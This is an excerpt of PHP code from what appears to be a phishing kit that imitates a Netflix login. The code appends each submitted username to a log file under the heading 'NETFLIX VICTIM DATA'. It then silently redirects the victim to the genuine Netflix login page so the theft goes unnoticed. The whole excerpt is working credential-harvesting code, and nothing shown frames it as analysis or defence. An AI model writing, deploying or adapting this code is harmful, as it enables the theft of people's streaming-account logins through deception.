...
file_put_contents($file, print_r("\nNETFLIX VICTIM DATA => Informations \n", true), FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
...
file_put_contents($file, "Username: " . $_POST['userLoginId'] . "\n", FILE_APPEND);
...
?>
 ...
 <meta http-equiv="refresh" content="0; url=https://www.netflix.com/gr-en/login"/> 
